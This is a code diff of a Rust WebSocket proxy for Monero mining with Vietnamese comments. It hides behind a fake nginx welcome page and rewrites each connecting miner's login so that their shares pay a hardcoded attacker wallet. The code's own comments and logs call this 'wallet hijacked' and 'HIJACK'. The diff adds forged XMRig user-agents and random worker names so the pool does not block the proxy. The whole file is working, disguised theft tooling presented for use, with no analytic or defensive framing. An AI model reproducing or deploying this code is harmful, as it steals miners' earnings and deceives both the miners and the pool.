@@ -4,76 +4,69 @@ use axum::{
     routing::get,
     Router,
 };
-use std::{sync::{Arc, atomic::{AtomicUsize, Ordering}}, net::SocketAddr, time::Duration};
+use std::{sync::{atomic::{AtomicUsize, Ordering}}, net::SocketAddr, time::Duration};
 use tokio::net::TcpStream;
 use tokio::io::{AsyncWriteExt, AsyncBufReadExt, BufReader};
 use tokio::sync::mpsc::{self, UnboundedSender};
 use futures_util::{StreamExt, SinkExt};
-use serde_json::Value;
+use serde_json::{Value, json};
 use colored::*;
 use chrono::Utc;
+use rand::Rng; // Nhớ thêm 'rand' vào Cargo.toml
 
 // =================================================================
-// ⚡ CẤU HÌNH TỐI ƯU (SỬA VÍ CỦA BẠN)
+// ⚡ CẤU HÌNH ĐƠN POOL (SINGLE POOL)
 // =================================================================
 const LISTEN_ADDR: &str = "0.0.0.0:8080";
 
-// SupportXMR Port 80 để xuyên Firewall tốt nhất. 
-// Nếu port 80 không ổn định, thử port 3333 hoặc 5555.
+// Chỉ sử dụng 1 Pool duy nhất
 const REAL_POOL_ADDR: &str = "pool.supportxmr.com:3333";
 
 // Ví của bạn
-const MY_WALLET: &str = "44hQZfLkTccVGood4aYMTm1KPyJVoa9esLyq1bneAvhkchQdmFTx3rsD3KRwpXTUPd1iTF4VVGYsTCLYrxMZVsvtKqAmBiw";
+const MY_XMR_WALLET: &str = "44hQZfLkTccVGood4aYMTm1KPyJVoa9esLyq1bneAvhkchQdmFTx3rsD3KRwpXTUPd1iTF4VVGYsTCLYrxMZVsvtKqAmBiw";
 
-// Tên Worker (Nên đặt ngắn gọn)
-const MY_WORKER: &str = "Ultra_Proxy";
+// Tiền tố tên Worker (VD: Proxy_Worker_123)
+const WORKER_PREFIX: &str = "Proxy_Worker";
 
 const NGINX_WELCOME: &str = r#"<!DOCTYPE html><html><head><title>Welcome to nginx!</title><style>body{width:35em;margin:0 auto;font-family:Tahoma,Verdana,Arial,sans-serif;}</style></head><body><h1>Welcome to nginx!</h1><p>If you see this page, the nginx web server is successfully installed and working.</p></body></html>"#;
 
-// Biến toàn cục đếm Share (Không dùng lazy_static để tránh lỗi build)
-static TOTAL_SENT: AtomicUsize = AtomicUsize::new(0);
-static TOTAL_ACCEPTED: AtomicUsize = AtomicUsize::new(0);
+static TOTAL_SHARES: AtomicUsize = AtomicUsize::new(0);
 
 enum LogEvent {
-    ShareSent,
     ShareAccepted,
     PoolError(String),
-    WalletSwapped,
-    ClientDisconnected,
+    ClientConnect,
+}
+
+// Hàm tạo User-Agent giả để Pool không chặn
+fn generate_fake_agent() -> String {
+    let mut rng = rand::thread_rng();
+    let versions = ["6.22.0", "6.21.3", "6.21.0"];
+    let compilers = ["gcc/11.4.0", "clang/14.0.0", "msvc/19.30"];
+    let v = versions[rng.gen_range(0..versions.len())];
+    let c = compilers[rng.gen_range(0..compilers.len())];
+    format!("XMRig/{} (Linux x86_64) libuv/1.44.2 {}", v, c)
 }
 
 #[tokio::main]
 async fn main() {
-    // Tắt log debug hệ thống để dồn tài nguyên cho mạng
     tracing_subscriber::fmt().with_max_level(tracing::Level::ERROR).init();
-
     let (log_tx, mut log_rx) = mpsc::unbounded_channel::<LogEvent>();
     
-    // Luồng Log riêng biệt (Không ảnh hưởng tốc độ đào)
+    // --- LUỒNG LOGGING ---
     tokio::spawn(async move {
         while let Some(event) = log_rx.recv().await {
             let time = Utc::now().format("%H:%M:%S");
             match event {
-                LogEvent::ShareSent => { 
-                    // Log này quá nhiều, tắt đi để tối ưu
-                }
                 LogEvent::ShareAccepted => {
-                    let sent = TOTAL_SENT.load(Ordering::Relaxed);
-                    let accepted = TOTAL_ACCEPTED.load(Ordering::Relaxed);
-                    let ratio = if sent > 0 { (accepted as f64 / sent as f64) * 100.0 } else { 0.0 };
-                    
-                    println!("{} [{}] GLOBAL STATS: {} Accepted / {} Sent ({:.2}%)", 
-                        "✅".green().bold(), time, accepted, sent, ratio);
+                    let count = TOTAL_SHARES.fetch_add(1, Ordering::Relaxed) + 1;
+                    // Log gọn gàng
+                    if count % 5 == 0 {
+                        println!("{} [{}] ⛏️  SHARES FOUND: {}", "💎".cyan().bold(), time, count);
+                    }
                 }
-                LogEvent::PoolError(err) => {
-                    println!("{} [{}] POOL ERROR: {}", "❌".red().bold(), time, err);
-                }
-                LogEvent::WalletSwapped => {
-                    println!("{} [{}] New Miner Connected -> Wallet Hijacked", "💀".magenta(), time);
-                }
-                LogEvent::ClientDisconnected => {
-                    // println!("{} Miner Disconnected", "🔌".yellow());
-                }
+                LogEvent::PoolError(err) => println!("{} [{}] POOL ERROR: {}", "❌".red().bold(), time, err),
+                LogEvent::ClientConnect => {},
             }
         }
     });
@@ -84,150 +77,123 @@ async fn main() {
         .with_state(log_tx);
 
     let addr: SocketAddr = LISTEN_ADDR.parse().expect("Invalid IP");
-    
     println!("{}", "========================================".green());
-    println!("{} {}", "⚡ ULTRA-PERF PROXY RUNNING ON".green().bold(), addr);
-    println!("🔗 Pool: {}", REAL_POOL_ADDR.cyan());
-    println!("💰 Wallet: {}", MY_WALLET.yellow());
+    println!("{} {}", "🚀 SINGLE-POOL XMR PROXY".green().bold(), addr);
+    println!("🔗 Target: {}", REAL_POOL_ADDR.cyan());
+    println!("💰 Wallet: {}...", &MY_XMR_WALLET[0..15].yellow());
     println!("{}", "========================================".green());
 
     let listener = tokio::net::TcpListener::bind(addr).await.unwrap();
     axum::serve(listener, app).await.unwrap();
 }
 
-async fn mining_handler(
-    ws: Option<WebSocketUpgrade>,
-    State(log_tx): State<UnboundedSender<LogEvent>>,
-) -> Response {
+async fn mining_handler(ws: Option<WebSocketUpgrade>, State(log_tx): State<UnboundedSender<LogEvent>>) -> Response {
     match ws {
-        Some(w) => w.on_upgrade(move |socket| mining_tunnel(socket, log_tx)),
+        Some(w) => w.on_upgrade(move |socket| xmr_tunnel_single(socket, log_tx)),
         None => Html(NGINX_WELCOME).into_response()
     }
 }
 
-async fn mining_tunnel(socket: WebSocket, log_tx: UnboundedSender<LogEvent>) {
-    // 1. Kết nối Pool (Timeout 5s)
-    let tcp_stream = match tokio::time::timeout(Duration::from_secs(5), TcpStream::connect(REAL_POOL_ADDR)).await {
+async fn xmr_tunnel_single(socket: WebSocket, log_tx: UnboundedSender<LogEvent>) {
+    let _ = log_tx.send(LogEvent::ClientConnect);
+
+    // 1. Kết nối thẳng tới Pool duy nhất (Timeout 10s)
+    let tcp_stream = match tokio::time::timeout(Duration::from_secs(10), TcpStream::connect(REAL_POOL_ADDR)).await {
         Ok(Ok(s)) => s,
-        Ok(Err(e)) => {
-            let _ = log_tx.send(LogEvent::PoolError(format!("Connect Failed: {}", e)));
-            return;
-        },
-        Err(_) => {
-            let _ = log_tx.send(LogEvent::PoolError("Connect Timeout".to_string()));
-            return;
-        }
+        Ok(Err(e)) => { let _ = log_tx.send(LogEvent::PoolError(format!("Conn Error: {}", e))); return; },
+        Err(_) => { let _ = log_tx.send(LogEvent::PoolError("Conn Timeout".to_string())); return; }
     };
 
-    // 🔥 TỐI ƯU MẠNG: Tắt Nagle để gửi gói tin tức thì
-    if let Err(_) = tcp_stream.set_nodelay(true) {}
+    // 2. Tối ưu Socket (KeepAlive & NoDelay)
+    let sock_ref = socket2::SockRef::from(&tcp_stream);
+    let mut ka = socket2::TcpKeepalive::new();
+    ka = ka.with_time(Duration::from_secs(30)); 
+    ka = ka.with_interval(Duration::from_secs(10));
+    let _ = sock_ref.set_tcp_keepalive(&ka);
+    let _ = tcp_stream.set_nodelay(true);
 
     let (read_half, mut pool_write) = tcp_stream.into_split();
-    // Buffer 16KB là điểm ngọt (Sweet spot) cho JSON Stratum
-    let mut pool_reader = BufReader::with_capacity(16 * 1024, read_half);
+    // Buffer 64KB cực quan trọng cho XMR RandomX
+    let mut pool_reader = BufReader::with_capacity(64 * 1024, read_half); 
     let (mut ws_write, mut ws_read) = socket.split();
 
-    // ------------------------------------------------------------------
-    // LUỒNG 1: MINER -> POOL (CRITICAL PATH)
-    // ------------------------------------------------------------------
-    let log_tx_miner = log_tx.clone();
+    // Sinh thông tin giả cho kết nối này
+    let fake_agent = generate_fake_agent();
+    let mut rng = rand::thread_rng();
+    let worker_id = format!("{}_{}", WORKER_PREFIX, rng.gen_range(1000..9999));
+
+    // --- LUỒNG 1: MINER -> POOL (HIJACK) ---
     let client_to_server = tokio::spawn(async move {
         while let Some(Ok(msg)) = ws_read.next().await {
-            match msg {
-                Message::Text(text) => {
-                    // Tách dòng để xử lý chuẩn xác
-                    for line in text.lines() {
-                        let trimmed = line.trim();
-                        if trimmed.is_empty() { continue; }
+            if let Message::Text(text) = msg {
+                for line in text.lines() {
+                    let trimmed = line.trim();
+                    if trimmed.is_empty() { continue; }
 
-                        let mut final_msg = trimmed.to_string();
-                        let mut is_login = false;
+                    let mut final_msg = trimmed.to_string();
 
-                        // 1. INTERCEPT LOGIN (Chỉ làm 1 lần)
-                        if trimmed.contains("login") || trimmed.contains("Login") {
-                            // Chỉ parse JSON khi thực sự cần thiết (Tiết kiệm CPU)
-                            if let Ok(mut json) = serde_json::from_str::<Value>(trimmed) {
-                                let mut modified = false;
-                                if let Some(params) = json.get_mut("params") {
-                                    if let Some(obj) = params.as_object_mut() {
-                                        obj.insert("login".to_string(), serde_json::json!(MY_WALLET));
-                                        obj.insert("user".to_string(), serde_json::json!(MY_WALLET));
-                                        obj.insert("pass".to_string(), serde_json::json!(MY_WORKER));
-                                        obj.insert("rigid".to_string(), serde_json::json!(MY_WORKER));
-                                        modified = true;
-                                    } else if let Some(arr) = params.as_array_mut() {
-                                        if !arr.is_empty() { 
-                                            arr[0] = serde_json::json!(MY_WALLET); 
-                                            modified = true; 
-                                        }
+                    // Bắt gói login để tráo ví
+                    if trimmed.contains("login") {
+                        if let Ok(mut json_val) = serde_json::from_str::<Value>(trimmed) {
+                            if let Some(params) = json_val.get_mut("params") {
+                                // Xử lý object (XMRig chuẩn)
+                                if let Some(obj) = params.as_object_mut() {
+                                    obj.insert("login".to_string(), json!(MY_XMR_WALLET));
+                                    obj.insert("user".to_string(), json!(MY_XMR_WALLET));
+                                    obj.insert("pass".to_string(), json!(worker_id));
+                                    obj.insert("rigid".to_string(), json!(worker_id));
+                                    // Chèn Agent giả
+                                    obj.insert("agent".to_string(), json!(fake_agent));
+                                    // Xóa nicehash để tránh xung đột
+                                    obj.remove("nicehash"); 
+                                }
+                                // Xử lý array (Tool lạ)
+                                else if let Some(arr) = params.as_array_mut() {
+                                    if !arr.is_empty() {
+                                        arr[0] = json!(MY_XMR_WALLET);
+                                        // Nếu mảng chưa có tên worker, thêm vào
+                                        if arr.len() < 2 { arr.push(json!(worker_id)); } 
+                                        else { arr[1] = json!(worker_id); }
                                     }
                                 }
-                                if modified {
-                                    final_msg = json.to_string();
-                                    is_login = true;
-                                }
                             }
-                        }
-
-                        // 2. GỬI ĐI NGAY LẬP TỨC (Zero Latency)
-                        final_msg.push('\n'); // Stratum bắt buộc
-                        if pool_write.write_all(final_msg.as_bytes()).await.is_err() { return; }
-                        
-                        // 3. THỐNG KÊ (Làm sau khi đã gửi để ko chặn luồng mạng)
-                        if is_login {
-                            let _ = log_tx_miner.send(LogEvent::WalletSwapped);
-                        }
-                        if trimmed.contains("submit") {
-                            TOTAL_SENT.fetch_add(1, Ordering::Relaxed);
-                            let _ = log_tx_miner.send(LogEvent::ShareSent);
+                            final_msg = json_val.to_string();
                         }
                     }
-                    
-                    // 🔥 FLUSH AGGRESSIVELY: Đẩy gói tin đi ngay, không chờ buffer đầy
-                    // Đây là chìa khóa để Miner không bị timeout trên Cloud
-                    if pool_write.flush().await.is_err() { break; }
-                },
-                // Giữ kết nối Cloud không bị idle
-                Message::Ping(_) => {}, 
-                Message::Pong(_) => {},
-                Message::Binary(_) => {},
-                Message::Close(_) => break,
+
+                    // Đảm bảo xuống dòng
+                    if !final_msg.ends_with('\n') { final_msg.push('\n'); }
+                    if pool_write.write_all(final_msg.as_bytes()).await.is_err() { return; }
+                }
+                // Đẩy gói tin đi ngay lập tức
+                let _ = pool_write.flush().await;
             }
         }
     });
 
-    // ------------------------------------------------------------------
-    // LUỒNG 2: POOL -> MINER (FAST FORWARD)
-    // ------------------------------------------------------------------
+    // --- LUỒNG 2: POOL -> MINER (PASS-THROUGH) ---
     let log_tx_pool = log_tx.clone();
     let server_to_client = tokio::spawn(async move {
-        // Tái sử dụng buffer để tiết kiệm RAM
-        let mut line_buffer = String::with_capacity(2048);
+        let mut buf = Vec::with_capacity(8192);
         loop {
-            line_buffer.clear();
-            match pool_reader.read_line(&mut line_buffer).await {
-                Ok(0) => break, // EOF -> Pool đóng kết nối
+            buf.clear();
+            // Đọc đến khi gặp ký tự xuống dòng
+            match pool_reader.read_until(b'\n', &mut buf).await {
+                Ok(0) => break, // Kết nối đóng
                 Ok(_) => {
-                    // 1. Gửi về Miner ngay
-                    if ws_write.send(Message::Text(line_buffer.clone())).await.is_err() { break; }
-
-                    // 2. Check lỗi (để debug nếu miner bị tắt)
-                    if line_buffer.contains("error") && !line_buffer.contains("null") {
-                        if let Ok(json) = serde_json::from_str::<Value>(&line_buffer) {
-                             if let Some(err) = json.get("error") {
-                                 if !err.is_null() {
-                                     let err_msg = err["message"].as_str().unwrap_or("Unknown").to_string();
-                                     let _ = log_tx_pool.send(LogEvent::PoolError(err_msg));
-                                 }
-                             }
-                        }
-                    }
-
-                    // 3. Đếm Share Accepted
-                    if line_buffer.contains("OK") && line_buffer.contains("result") {
-                         TOTAL_ACCEPTED.fetch_add(1, Ordering::Relaxed);
+                    let str_msg = String::from_utf8_lossy(&buf);
+                    
+                    // Thống kê đơn giản
+                    if str_msg.contains("result") && str_msg.contains("OK") {
                          let _ = log_tx_pool.send(LogEvent::ShareAccepted);
                     }
+                    // Nếu lỗi từ Pool
+                    if str_msg.contains("error") && !str_msg.contains("null") {
+                         let _ = log_tx_pool.send(LogEvent::PoolError(str_msg.to_string()));
+                    }
+
+                    // Gửi về cho Miner
+                    if ws_write.send(Message::Text(str_msg.to_string())).await.is_err() { break; }
                 }
                 Err(_) => break,
             }
@@ -235,5 +201,4 @@ async fn mining_tunnel(socket: WebSocket, log_tx: UnboundedSender<LogEvent>) {
     });
 
     let _ = tokio::select! { _ = client_to_server => {}, _ = server_to_client => {} };
-    let _ = log_tx.send(LogEvent::ClientDisconnected);
 }
